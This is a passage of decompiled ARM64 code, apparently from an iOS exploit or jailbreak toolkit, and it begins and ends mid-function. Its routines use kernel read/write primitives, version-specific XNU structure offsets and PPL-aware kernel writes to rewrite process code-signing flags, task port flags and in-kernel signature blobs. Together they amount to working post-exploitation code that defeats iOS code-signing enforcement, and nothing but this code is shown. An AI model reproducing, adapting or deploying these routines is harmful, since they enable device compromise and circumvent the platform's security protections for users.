  size_t v7; // x1
  __int64 v8; // x8
  __int64 v9; // x9
  void *v10; // x21
  size_t v11; // x2
  int v12; // [xsp+4h] [xbp-5Ch] BYREF
  uint8_t __src[48]; // [xsp+8h] [xbp-58h] BYREF

  v5 = csblob_find_entry(ctx, slot, magic);
  result = (__int64)csblob_find_entry(ctx, ctx->selectedSlot, -86111230);
  if ( result )
  {
    if ( bswap32(*(uint32_t *)(result + 24)) < slot )
      return 0;
    v7 = ctx->specialSlotOffset;
    v8 = result + bswap32(*(uint32_t *)(result + 16));
    v9 = (unsigned int)v7 * slot;
    v10 = (void *)(v8 - v9);
    if ( v5 )
    {
      v12 = 48;
      result = compute_sha_hash(*(unsigned __int8 *)(result + 37), v5, bswap32(v5[1]), __src, &v12);
      if ( !(uint32_t)result )
        return result;
      v11 = ctx->specialSlotOffset;
      if ( (uint32_t)v11 != v12 )
        return 0;
      memcpy(v10, __src, v11);
    }
    else
    {
      bzero((void *)(v8 - v9), v7);
    }
    return 1;
  }
  return result;
}

//----- (000000000002D500) ----------------------------------------------------
bool __fastcall ce_serialize_cfplist(const UInt8 *a1, CFIndex a2, __int64 a3)
{
  void *v6; // x0
  void *v7; // x19
  __int64 *v8; // x0
  __int64 v9; // x26
  __int64 *v10; // x0
  __int64 v11; // x23
  __int64 (__fastcall *v12)(__int64, CFPropertyListRef, __int64); // x0
  __int64 (__fastcall *v13)(__int64, CFPropertyListRef, __int64); // x24
  const struct __CFData *v14; // x0
  const struct __CFData *v15; // x21
  CFPropertyListRef v16; // x0
  const void *v17; // x22
  uint64_t v18; // x20

  v6 = dlopen("/usr/lib/libCoreEntitlements.dylib", 1);
  if ( v6 )
  {
    v7 = v6;
    v8 = (__int64 *)dlsym(v6, "kCENoError");
    if ( v8 )
    {
      v9 = *v8;
      v10 = (__int64 *)dlsym(v7, "CECRuntime");
      if ( v10 )
      {
        v11 = *v10;
        v12 = (__int64 (__fastcall *)(__int64, CFPropertyListRef, __int64))dlsym(v7, "CESerializeCFDictionary");
        if ( v12 )
        {
          v13 = v12;
          if ( dlsym(v7, "CEGetErrorString") )
          {
            v14 = CFDataCreateWithBytesNoCopy(kCFAllocatorDefault, a1, a2, kCFAllocatorNull);
            if ( v14 )
            {
              v15 = v14;
              v16 = CFPropertyListCreateWithData(kCFAllocatorDefault, v14, 0, 0, 0);
              if ( v16 )
              {
                v17 = v16;
                v18 = v9 == v13(v11, v16, a3);
                CFRelease(v15);
                CFRelease(v17);
LABEL_12:
                dlclose(v7);
                return v18;
              }
              CFRelease(v15);
            }
          }
        }
      }
    }
    v18 = 0;
    goto LABEL_12;
  }
  return 0;
}

//----- (000000000002D64C) ----------------------------------------------------
uint32_t *__fastcall csblob_alloc_and_insert_entry(struct csblob_walk_ctx *ctx, int slot, unsigned int magic, const void *data, unsigned int size)
{
  size_t v9; // x24
  unsigned int v10; // w25
  uint32_t *result; // x0
  uint32_t *v12; // x22

  if ( (ctx->flags & 1) != 0 && ctx->containerKind == 1 )
  {
    v9 = size;
    v10 = size + 8;
    result = malloc(size + 8LL);
    if ( !result )
      return result;
    v12 = result;
    *result = bswap32(magic);
    result[1] = bswap32(v10);
    memcpy(result + 2, data, v9);
    if ( (unsigned int)csblob_realloc_array((unsigned int *)ctx->container, slot, (__int64)v12) != -1 )
      return &def_3E8F0 + 1;
    csblob_bzero_and_free(v12);
  }
  return 0;
}
// 0: using guessed type int def_3E8F0;

//----- (000000000002D700) ----------------------------------------------------
unsigned int *__fastcall csblob_repack_entries(struct csblob_walk_ctx *ctx, unsigned int minSlotCount)
{
  unsigned int *result; // x0
  unsigned int *v5; // x21
  unsigned int v6; // w25
  int v7; // w26
  int v8; // w24
  size_t v9; // x23
  unsigned int *v10; // x20
  __int64 v11; // x23
  size_t v12; // x2
  __int64 v13; // x8
  unsigned int v14; // w8
  unsigned int v15; // w9
  __int64 v16; // x19

  result = csblob_find_entry(ctx, ctx->selectedSlot, -86111230);
  if ( result )
  {
    v5 = result;
    v6 = bswap32(result[6]);
    if ( v6 >= minSlotCount )
    {
      return (unsigned int *)(&def_3E8F0 + 1);
    }
    else
    {
      v7 = ctx->specialSlotOffset;
      v8 = v7 * (minSlotCount - v6);
      v9 = bswap32(result[1]) + v8;
      result = (unsigned int *)malloc(v9);
      if ( result )
      {
        v10 = result;
        bzero(result, v9);
        v11 = v7 * v6;
        memcpy(v10, v5, bswap32(v5[4]) - (unsigned int)v11);
        v12 = bswap32(v5[1]) + (uint32_t)v11 - bswap32(v5[4]);
        v13 = bswap32(v10[4]) + v8;
        v10[4] = bswap32(v13);
        v10[1] = bswap32(bswap32(v10[1]) + v8);
        v10[6] = bswap32(minSlotCount);
        memcpy((char *)v10 + v13 - v11, (char *)v5 + bswap32(v5[4]) - v11, v12);
        v14 = bswap32(v5[4]);
        if ( bswap32(v5[5]) > v14 )
          v10[5] = bswap32(bswap32(v10[5]) + v8);
        v15 = bswap32(v5[2]);
        if ( v15 >> 8 >= 0x201 )
        {
          if ( bswap32(v5[11]) > v14 )
            v10[11] = bswap32(bswap32(v10[11]) + v8);
          if ( v15 > 0x201FF )
          {
            if ( bswap32(v5[12]) > v14 )
              v10[12] = bswap32(bswap32(v10[12]) + v8);
            if ( v15 > 0x204FF )
            {
              if ( bswap32(v5[23]) > v14 )
                v10[23] = bswap32(bswap32(v10[23]) + v8);
              if ( v15 > 0x205FF && bswap32(v5[25]) > v14 )
                v10[25] = bswap32(bswap32(v10[25]) + v8);
            }
          }
        }
        v16 = csblob_replace_entry(ctx, ctx->selectedSlot, v10);
        free(v10);
        return (unsigned int *)v16;
      }
    }
  }
  return result;
}
// 0: using guessed type int def_3E8F0;

//----- (000000000002D934) ----------------------------------------------------
__int64 __fastcall validate_physmap_range_6(struct_krwCtx *krwCtx, unsigned int a2)
{
  __int64 result; // x0
  __int64 v5; // x20
  __int64 v6; // x1
  __int64 v7; // x0
  int v8; // w8
  struct_krwCtx *v9; // x0
  int v10; // w1
  int has_flag; // w0
  bool v12; // zf
  __int64 v13; // x22
  __int64 v14; // x23
  __int64 v15; // x8
  __int64 v16; // x9
  int xnuMajorVersion; // w8
  __int64 v18; // x8
  int v19; // w0
  unsigned __int64 xnuVersionPacked; // x9
  int v21; // w0
  __int64 v22; // x8
  __int64 v23; // x9
  int v24; // w0
  __int64 v25; // x21
  int v26; // w8
  char v27; // [xsp+Fh] [xbp-31h] BYREF

  v27 = 0;
  if ( !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A11_A12_A13_A14_A15_A16_A17_MASK) )
    return 1;
  result = task_struct_field_kread(krwCtx, a2);
  if ( !result )
    return result;
  v5 = result;
  if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) )
  {
    v6 = v5 + 146;
LABEL_5:
    v7 = krwCtx;
    goto LABEL_6;
  }
  if ( !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK) )
  {
    result = krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A11);
    if ( !(uint32_t)result )
      return result;
    xnuMajorVersion = krwCtx->xnuMajorVersion;
    if ( xnuMajorVersion >= 6153 )
    {
      if ( xnuMajorVersion <= 8791 )
      {
        if ( xnuMajorVersion <= 8018 )
        {
          if ( xnuMajorVersion <= 7194 )
          {
            v18 = 239;
            if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(6153, 40, 120, 1023, 1023) )
              v18 = 231;
          }
          else
          {
            v18 = 223;
          }
        }
        else
        {
          v18 = 151;
        }
      }
      else
      {
        v18 = 143;
      }
      v6 = v18 + v5;
      goto LABEL_5;
    }
    return 1;
  }
  v8 = krwCtx->xnuMajorVersion;
  if ( v8 >= 10002 )
  {
    v9 = krwCtx;
    v10 = 18350080;
LABEL_13:
    has_flag = krw_ctx_has_flag(v9, v10);
    v12 = !has_flag;
    if ( has_flag )
      v13 = 201;
    else
      v13 = 193;
    if ( has_flag )
      v14 = 202;
    else
      v14 = 194;
    v15 = 199;
    v16 = 191;
LABEL_50:
    if ( v12 )
      v15 = v16;
    goto LABEL_52;
  }
  if ( v8 >= 8792 )
  {
    v19 = krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A14_A15_A16_MASK);
    v12 = !v19;
    if ( v19 )
      v13 = 193;
    else
      v13 = 185;
    if ( v19 )
      v14 = 194;
    else
      v14 = 186;
    v15 = 191;
    v16 = 183;
    goto LABEL_50;
  }
  if ( v8 >= 8019 )
  {
    v9 = krwCtx;
    v10 = 1572864;
    goto LABEL_13;
  }
  xnuVersionPacked = krwCtx->xnuVersionPacked;
  if ( xnuVersionPacked >= XNU_VERSION_PACKED(7195, 42, 1, 0, 0) )
  {
    v21 = krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A14);
    v12 = !v21;
    if ( v21 )
      v13 = 265;
    else
      v13 = 257;
    v22 = 266;
    v23 = 258;
LABEL_46:
    if ( v12 )
      v14 = v23;
    else
      v14 = v22;
    v15 = 263;
    v16 = 255;
    goto LABEL_50;
  }
  if ( v8 >= 7195 )
  {
    v24 = krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A14);
    v12 = !v24;
    if ( v24 )
      v13 = 264;
    else
      v13 = 256;
    v22 = 265;
    v23 = 257;
    goto LABEL_46;
  }
  if ( xnuVersionPacked <= XNU_VERSION_PACKED(6153, 40, 120, 1023, 1023) )
    v13 = 272;
  else
    v13 = 264;
  if ( xnuVersionPacked <= XNU_VERSION_PACKED(6153, 40, 120, 1023, 1023) )
    v14 = 273;
  else
    v14 = 265;
  v15 = 271;
  if ( xnuVersionPacked > XNU_VERSION_PACKED(6153, 40, 120, 1023, 1023) )
    v15 = 263;
LABEL_52:
  v25 = v15 + v5;
  v26 = krw_read_thunk(krwCtx, v15 + v5, 1, &v27);
  result = 0;
  if ( !v26 )
    return result;
  if ( !v27 )
    return result;
  result = krw_read_thunk(krwCtx, v13 + v5, 1, &v27);
  if ( !(uint32_t)result )
    return result;
  if ( !v27 )
    return 1;
  result = krw_read_thunk(krwCtx, v14 + v5, 1, &v27);
  if ( (uint32_t)result )
  {
    if ( !v27 )
      return 0;
    v7 = krwCtx;
    v6 = v25;
LABEL_6:
    result = krw_read_thunk((struct_krwCtx *)v7, v6, 1, &v27);
    if ( !(uint32_t)result )
      return result;
    return v27 != 0;
  }
  return result;
}

//----- (000000000002DC40) ----------------------------------------------------
__int64 __fastcall physmap_pgtable_check_and_append(struct_krwCtx *krwCtx, unsigned int a2)
{
  __int64 result; // x0
  __int64 v5; // x20
  int v6; // w8
  int xnuMajorVersion; // w8
  struct_krwCtx *v8; // x0
  int v9; // w1
  int has_flag; // w0
  bool v11; // zf
  __int64 v12; // x8
  __int64 v13; // x9
  __int64 v14; // x10
  int v15; // w0
  __int64 v16; // x21
  unsigned __int64 xnuVersionPacked; // x9
  int v18; // w0
  int v19; // w0
  unsigned __int8 v20; // [xsp+Fh] [xbp-31h] BYREF
  __int64 v21; // [xsp+10h] [xbp-30h] BYREF
  unsigned __int8 v22; // [xsp+1Fh] [xbp-21h] BYREF

  v22 = 0;
  if ( !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK) )
    return 1;
  result = task_struct_field_kread(krwCtx, a2);
  if ( !result )
    return result;
  v5 = result;
  if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) )
  {
    result = kread_physmap_decorated(krwCtx, v5 + 176, (unsigned __int64 *)&v21);
    if ( (uint32_t)result )
    {
      result = validate_kaddr_range(krwCtx, v21);
      if ( result )
      {
        result = krw_read_thunk(krwCtx, v21 + 32, 1, &v20);
        if ( (uint32_t)result )
        {
          v6 = v20;
          return v6 != 0;
        }
      }
    }
    return result;
  }
  xnuMajorVersion = krwCtx->xnuMajorVersion;
  if ( xnuMajorVersion >= 10002 )
  {
    v8 = krwCtx;
    v9 = 18350080;
LABEL_10:
    has_flag = krw_ctx_has_flag(v8, v9);
    v11 = !has_flag;
    v12 = 201;
    if ( !has_flag )
      v12 = 193;
    v13 = 202;
    v14 = 194;
LABEL_17:
    if ( v11 )
      v16 = v14;
    else
      v16 = v13;
    goto LABEL_20;
  }
  if ( xnuMajorVersion >= 8792 )
  {
    v15 = krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A14_A15_A16_MASK);
    v11 = !v15;
    v12 = 193;
    if ( !v15 )
      v12 = 185;
    v13 = 194;
    v14 = 186;
    goto LABEL_17;
  }
  if ( xnuMajorVersion >= 8019 )
  {
    v8 = krwCtx;
    v9 = 1572864;
    goto LABEL_10;
  }
  xnuVersionPacked = krwCtx->xnuVersionPacked;
  if ( xnuVersionPacked >= XNU_VERSION_PACKED(7195, 42, 1, 0, 0) )
  {
    v18 = krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A14);
    v11 = !v18;
    v12 = 265;
    if ( !v18 )
      v12 = 257;
    v13 = 266;
    v14 = 258;
    goto LABEL_17;
  }
  if ( xnuMajorVersion >= 7195 )
  {
    v19 = krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A14);
    v11 = !v19;
    v12 = 264;
    if ( !v19 )
      v12 = 256;
    v13 = 265;
    v14 = 257;
    goto LABEL_17;
  }
  v12 = 272;
  if ( xnuVersionPacked <= XNU_VERSION_PACKED(6153, 40, 120, 1023, 1023) )
  {
    v16 = 273;
  }
  else
  {
    v12 = 264;
    v16 = 265;
  }
LABEL_20:
  result = krw_read_thunk(krwCtx, v12 + v5, 1, &v22);
  if ( !(uint32_t)result )
    return result;
  if ( !v22 )
    return 1;
  result = krw_read_thunk(krwCtx, v16 + v5, 1, &v22);
  if ( (uint32_t)result )
  {
    v6 = v22;
    return v6 != 0;
  }
  return result;
}

//----- (000000000002DE64) ----------------------------------------------------
mach_vm_address_t __fastcall kread_and_set_vm_attr(struct_krwCtx *krwCtx, unsigned int a2)
{
  mach_vm_address_t result; // x0
  mach_vm_address_t v4; // x20
  int v5; // [xsp+Ch] [xbp-14h] BYREF

  result = get_task_csflags_kaddr(krwCtx, a2);
  if ( result )
  {
    v4 = result;
    result = kread_u32(krwCtx, result, &v5);
    if ( (uint32_t)result )
      return (v5 & 1) != 0 || (unsigned int)ppl_kwrite32(krwCtx, v4, v5 | 1u) != 0;
  }
  return result;
}

//----- (000000000002DED4) ----------------------------------------------------
mach_vm_address_t __fastcall pgtable_kread_vm_attr_loop(struct_krwCtx *krwCtx, unsigned int a2, int a3)
{
  mach_vm_address_t result; // x0
  mach_vm_address_t v7; // x22
  int v8; // w8
  unsigned int v9; // w9
  int v10; // w10
  unsigned __int64 v11; // x21
  unsigned __int64 v12; // x21
  int v13; // w8
  int v14; // w9
  int v15; // w10
  int v16; // w9
  int v17; // w2
  int v18; // [xsp+Ch] [xbp-24h] BYREF

  result = physmap_pgtable_check_and_append(krwCtx, a2);
  if ( (uint32_t)result )
  {
    result = get_task_csflags_kaddr(krwCtx, a2);
    if ( result )
    {
      v7 = result;
      result = kread_u32(krwCtx, result, &v18);
      if ( (uint32_t)result )
      {
        v8 = v18;
        v9 = v18 & 0xEFFFFCFE;
        v10 = a3 ? 268435457 : 769;
        v18 = v10 | v9;
        if ( (v10 | v9) == v8 || (result = ppl_kwrite32(krwCtx, v7, v10 | v9), (uint32_t)result) )
        {
          result = find_kernel_struct_addr(krwCtx, a2);
          if ( result )
          {
            v11 = result;
            result = get_task_struct_csblob_offset(krwCtx);
            if ( (uint32_t)result )
            {
              v12 = v11 + (unsigned int)result;
              result = kread_u32(krwCtx, v12, &v18);
              if ( (uint32_t)result )
              {
                v13 = v18;
                if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(7195, 120, 37, 1023, 1023) )
                  v14 = 16;
                else
                  v14 = 32784;
                v15 = v14 | v18;
                v16 = v18 & ~v14;
                if ( a3 )
                  v17 = v16;
                else
                  v17 = v15;
                v18 = v17;
                if ( v17 == v13 )
                  return 1;
                result = noppl_kwrite32(krwCtx, v12, v17);
                if ( (uint32_t)result )
                  return 1;
              }
            }
          }
        }
      }
    }
  }
  return result;
}

//----- (000000000002E00C) ----------------------------------------------------
mach_vm_address_t __fastcall setup_pgtable_and_patch_csblob(struct_krwCtx *krwCtx, unsigned int a2)
{
  mach_vm_address_t result; // x0
  mach_vm_address_t v4; // x0
  unsigned __int64 v5; // x8
  mach_vm_address_t v6; // x0
  unsigned __int64 v8; // x8
  __int64 v9; // x8
  unsigned __int64 v11; // x1
  __int64 v12; // x2
  unsigned __int64 *v13; // x8
  unsigned __int64 v14; // x8
  unsigned __int64 v15; // x8
  bool v16; // zf
  __int128 v18[6]; // [xsp+0h] [xbp-1F0h] BYREF
  __int64 v19; // [xsp+60h] [xbp-190h]
  unsigned __int64 v20; // [xsp+68h] [xbp-188h] BYREF
  unsigned int v21; // [xsp+74h] [xbp-17Ch] BYREF
  uint8_t v22[8]; // [xsp+78h] [xbp-178h] BYREF
  __int64 v23; // [xsp+80h] [xbp-170h]
  unsigned __int64 v24; // [xsp+98h] [xbp-158h]
  __int64 v25; // [xsp+A0h] [xbp-150h]
  __int128 v26; // [xsp+E0h] [xbp-110h] BYREF
  __int128 v27[11]; // [xsp+F0h] [xbp-100h] BYREF
  __int64 v28; // [xsp+1A0h] [xbp-50h]

  result = get_task_port_kaddr_wrap(krwCtx, a2, &v21);
  if ( result )
  {
    v4 = result;
    if ( (v21 & 0x400) != 0 || (result = noppl_kwrite32(krwCtx, v4, v21 | 0x400), (uint32_t)result) )
    {
      if ( ((v5 = krwCtx->xnuVersionPacked, v5 <= XNU_VERSION_PACKED(8792, 40, 107, 1023, 1023))
        && (v5 < XNU_VERSION_PACKED(8020, 241, 8, 0, 0) || krwCtx->xnuMajorVersion > 8791))
        || ((result = get_task_port_kaddr_checked(krwCtx, a2, 1, &v21)) != 0
        && ((v21 & 0x400) != 0 || (result = ppl_kwrite32(krwCtx, result, v21 | 0x400), (uint32_t)result))) )
      {
        result = csblob_read_and_patch(krwCtx, a2, (__int64)v22);
        if ( (uint32_t)result )
        {
          result = csblob_set_cs_flags(krwCtx, (__int64)v22);
          if ( (uint32_t)result )
          {
            v8 = krwCtx->xnuVersionPacked;
            if ( v8 >= XNU_VERSION_PACKED(7195, 100, 326, 0, 0) && ((krwCtx->flags & KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) != 0 || v8 >= XNU_VERSION_PACKED(8019, 0, 0, 0, 0)) )
            {
              if ( v24 )
              {
                result = kread_physmap_decorated(krwCtx, v24, &v20);
                if ( !(uint32_t)result )
                  return result;
                v11 = v20;
                if ( v20 )
                {
                  while ( 1 )
                  {
                    v28 = 0;
                    memset(&v27[1], 0, 160);
                    v12 = krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) ? 48LL : 64LL;
                    v26 = 0u;
                    v27[0] = 0u;
                    if ( !(unsigned int)krw_read_thunk(krwCtx, v11, v12, &v26) )
                      break;
                    v13 = krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023)
                        ? (unsigned __int64 *)((char *)v27 + 8)
                        : (unsigned __int64 *)((char *)&v27[1] + 8);
                    v14 = *v13;
                    v16 = v25 == v14;
                    v15 = v14 >> 29;
                    v16 = v16 || v15 == 0;
                    if ( !v16 )
                    {
                      v19 = 0;
                      v18[0] = __PAIR128__(v20, 0);
                      memset(&v18[1], 0, 80);
                      if ( !(unsigned int)csblob_set_cs_flags(krwCtx, (__int64)v18) )
                        break;
                    }
                    result = kread_physmap_decorated(krwCtx, v20, &v20);
                    if ( !(uint32_t)result )
                      return result;
                    v11 = v20;
                    if ( !v20 )
                      goto LABEL_16;
                  }
                }
              }
              return 0;
            }
LABEL_16:
            csblob_free_entry((struct csblob_walk_ctx *)v22);
            result = walk_proc_and_get_csblob_addr(krwCtx, a2, (unsigned __int64 *)v18);
            if ( (uint32_t)result )
            {
              result = csblob_chain_walk_offsets(krwCtx, a2, (__int64 *)v18, 0, (__int64)v22);
              if ( (uint32_t)result )
              {
                v9 = 72;
                if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
                  v9 = 88;
                if ( (unsigned int)krw_read_thunk(krwCtx, v9 + v23, 20, &v26)
                  && physmap_single_check(krwCtx, (__int64)&v26, 20) )
                {
                  result = csblob_set_cs_flags(krwCtx, (__int64)v22);
                  if ( (uint32_t)result )
                  {
                    csblob_free_entry((struct csblob_walk_ctx *)v22);
                    return 1;
                  }
                  return result;
                }
                return 0;
              }
            }
          }
        }
      }
    }
  }
  return result;
}

//----- (000000000002E310) ----------------------------------------------------
__int64 __fastcall csblob_set_cs_flags(struct_krwCtx *krwCtx, __int64 a2)
{
  unsigned __int64 v4; // x8
  __int64 v5; // x22
  __int64 result; // x0
  __int64 v6; // x22
  int v7; // w8
  int v8; // w9
  __int64 v9; // x21
  unsigned __int64 v11; // [xsp+0h] [xbp-30h] BYREF
  int v12; // [xsp+8h] [xbp-28h] BYREF
  int v13; // [xsp+Ch] [xbp-24h] BYREF

  v13 = 1;
  v4 = krwCtx->xnuVersionPacked;
  if ( v4 <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
  {
    if ( v4 <= XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023) )
    {
      if ( v4 <= XNU_VERSION_PACKED(7195, 100, 325, 1023, 1023) )
      {
        if ( krwCtx->xnuMajorVersion <= 7194 )
          v5 = 168;
        else
          v5 = 160;
      }
      else
      {
        v5 = 168;
      }
    }
    else
    {
      v5 = 184;
    }
  }
  else
  {
    v5 = 172;
  }
  result = krw_read_thunk(krwCtx, *(uint64_t *)(a2 + 8) + v5, 1, &v13);
  if ( (uint32_t)result )
  {
    if ( (v13 & 1) != 0
      || (v13 |= 1u,
          result = kwritebuf_universal(krwCtx, *(uint64_t *)(a2 + 8) + v5, &v13, 1u),
          (uint32_t)result) )
    {
      v6 = krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) ? 16LL : 32LL;
      result = krw_read_thunk(krwCtx, v6 + *(uint64_t *)(a2 + 8), 4, &v12);
      if ( (uint32_t)result )
      {
        v7 = v12;
        if ( (~v12 & 0x4004000) != 0 )
        {
          v8 = krwCtx->xnuMajorVersion <= 7194 ? 0x4004000 : 0x4000000;
          v12 |= v8;
          if ( (v8 | v7) != v7 )
          {
            result = kwritebuf_universal(krwCtx, *(uint64_t *)(a2 + 8) + v6, &v12, 4u);
            if ( !(uint32_t)result )
              return result;
            *(uint32_t *)a2 = v12;
          }
        }
        if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
          v9 = 128;
        else
          v9 = 136;
        result = kread_physmap_decorated(krwCtx, v9 + *(uint64_t *)(a2 + 8), &v11);
        if ( (uint32_t)result )
        {
          if ( !v11 || (result = kwrite64_dispatch(krwCtx, *(uint64_t *)(a2 + 8) + v9, 0), (uint32_t)result) )
          {
            *(uint32_t *)(a2 + 80) = 0;
            return 1;
          }
        }
      }
    }
  }
  return result;
}

//----- (000000000002E4E0) ----------------------------------------------------
__int64 __fastcall walk_proc_and_get_csblob_addr(struct_krwCtx *krwCtx, unsigned int a2, unsigned __int64 *a3)
{
  __int64 result; // x0
  unsigned __int64 v6; // x21
  unsigned __int64 v7; // x0
  __int64 v8; // x0
  __int64 v9; // x21
  unsigned __int64 v10; // x8
  unsigned __int64 v11; // [xsp+8h] [xbp-38h] BYREF
  unsigned int v12; // [xsp+10h] [xbp-30h] BYREF
  int v13; // [xsp+14h] [xbp-2Ch] BYREF
  unsigned __int64 v14; // [xsp+18h] [xbp-28h] BYREF

  v14 = 0;
  result = task_self_get_ipc_port(krwCtx, a2);
  if ( result )
  {
    v6 = result;
    result = get_task_struct_offset(krwCtx, result);
    if ( result )
    {
      result = kread_physmap_decorated(krwCtx, result, &v14);
      if ( (uint32_t)result )
      {
        if ( (v14 & 4) != 0 )
        {
          v10 = v14 & 0xFFFFFFFFFFFFF000LL;
          goto LABEL_11;
        }
        v7 = maybe_ipc_port_get_kobject(krwCtx, v6);
        if ( v7 )
        {
          v8 = read_kaddr_at_task_offset(krwCtx, v7);
          if ( v8 )
          {
            v9 = v8;
            if ( (unsigned int)get_csblob_offset_pair(krwCtx, &v13, (int *)&v12) )
            {
              if ( (unsigned int)krw_read_thunk(krwCtx, v9 + v12, 8, &v11) )
              {
                v10 = v11;
LABEL_11:
                *a3 = v10;
                return 1;
              }
            }
          }
        }
        return 0;
      }
    }
  }
  return result;
}

//----- (000000000002E5C0) ----------------------------------------------------
__int64 __fastcall csblob_chain_walk_offsets(struct_krwCtx *krwCtx, unsigned int a2, __int64 *a3, unsigned __int8 a4, __int64 a5)
{
  struct csblob_walk_ctx *ctx; // x20
  unsigned __int64 csblobKaddr; // x23
  __int64 blobSizeOffset; // x24
  __int64 blobDataOffset; // x21
  __int64 flagsOffset; // x27
  __int64 specialSlotPtrOffset; // x25
  __int64 cmsBlobPtrOffset; // x8
  __int64 alternateSlotPtrOffset; // x28
  __int64 teamIdOrEntitlementsOffset; // x26
  __int64 v17; // x24
  unsigned int *v18; // x0
  unsigned int *blobBytes; // x21
  size_t blobSize; // x8
  unsigned __int64 blobDataKaddr; // x9
  unsigned __int64 chainHeadKaddr; // x10
  size_t specialSlotOffset; // x23
  size_t alternateSlotOffset; // x10
  size_t cmsBlobOffset; // x10
  unsigned int v26; // w8
  unsigned int v27; // w27
  __int64 v28; // x28
  unsigned int *v29; // x8
  unsigned int *v30; // x22
  unsigned int v31; // w25
  __int64 v32; // x26
  uint32_t *v34; // x0
  uint32_t *v35; // x23
  int v36; // w24
  unsigned __int64 v37; // x26
  uint32_t *v39; // x0
  int v40; // w1
  __int64 v41; // x9
  __int64 v42; // x10
  unsigned int *v43; // x8
  unsigned int *v44; // x0
  unsigned int v45; // w27
  unsigned int **v46; // x11
  int v47; // w15
  unsigned int v48; // w16
  __int64 v49; // x22
  size_t v50; // x23
  char *v51; // x0
  char *v52; // x24
  unsigned int *v53; // x0
  int v54; // [xsp+8h] [xbp-A8h]
  unsigned int *container; // [xsp+10h] [xbp-A0h]
  __int64 teamIdOrEntitlementsKaddr; // [xsp+18h] [xbp-98h] BYREF
  unsigned __int64 chainHeadOut; // [xsp+20h] [xbp-90h] BYREF
  unsigned __int64 signatureKaddr; // [xsp+28h] [xbp-88h] BYREF
  unsigned __int64 cmsBlobKaddr; // [xsp+30h] [xbp-80h] BYREF
  unsigned __int64 alternateSlotKaddr; // [xsp+38h] [xbp-78h] BYREF
  unsigned __int64 specialSlotKaddr; // [xsp+40h] [xbp-70h] BYREF
  size_t blobSizeRead; // [xsp+48h] [xbp-68h] BYREF
  unsigned __int64 blobDataKaddrRead; // [xsp+50h] [xbp-60h] BYREF
  int csFlags; // [xsp+5Ch] [xbp-54h] BYREF

  csFlags = 0;
  blobSizeRead = 0;
  blobDataKaddrRead = 0;
  alternateSlotKaddr = 0;
  specialSlotKaddr = 0;
  signatureKaddr = 0;
  cmsBlobKaddr = 0;
  teamIdOrEntitlementsKaddr = 0;
  chainHeadOut = 0;
  if ( !a5 )
    return 0;
  ctx = (struct csblob_walk_ctx *)a5;
  csblobKaddr = walk_task_csblob_chain(krwCtx, a2, a3, a4, &chainHeadOut);
  if ( !csblobKaddr )
    return 0;
  blobSizeOffset = krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) ? 48LL : 64LL;
  blobDataOffset = krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) ? 64LL : 80LL;
  flagsOffset = krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) ? 16LL : 32LL;
  specialSlotPtrOffset = krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) ? 120LL : 128LL;
  cmsBlobPtrOffset = 136;
  alternateSlotPtrOffset = krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) ? 128LL : 136LL;
  if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
  {
    teamIdOrEntitlementsOffset = 24;
  }
  else
  {
    cmsBlobPtrOffset = 144;
    teamIdOrEntitlementsOffset = 40;
  }
  if ( !kread_physmap_decorated(krwCtx, cmsBlobPtrOffset + csblobKaddr, &cmsBlobKaddr)
    || (krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023) && !kread_physmap_decorated(krwCtx, csblobKaddr + 152, &signatureKaddr))
    || !kread_physmap_decorated(krwCtx, specialSlotPtrOffset + csblobKaddr, &specialSlotKaddr)
    || !kread_physmap_decorated(krwCtx, alternateSlotPtrOffset + csblobKaddr, &alternateSlotKaddr)
    || !kread_u32(krwCtx, flagsOffset + csblobKaddr, &csFlags)
    || (csFlags & 1) == 0
    || !kread_physmap_decorated(krwCtx, blobSizeOffset + csblobKaddr, &blobSizeRead)
    || !kread_physmap_decorated(krwCtx, blobDataOffset + csblobKaddr, &blobDataKaddrRead) )
  {
    return 0;
  }
  v17 = 0;
  if ( blobDataKaddrRead && blobSizeRead )
  {
    if ( (unsigned int)krw_read_thunk(krwCtx, teamIdOrEntitlementsOffset + csblobKaddr, 8, &teamIdOrEntitlementsKaddr) )
    {
      v18 = (unsigned int *)malloc(blobSizeRead);
      if ( v18 )
      {
        blobBytes = v18;
        memset(ctx, 0, sizeof(*ctx));
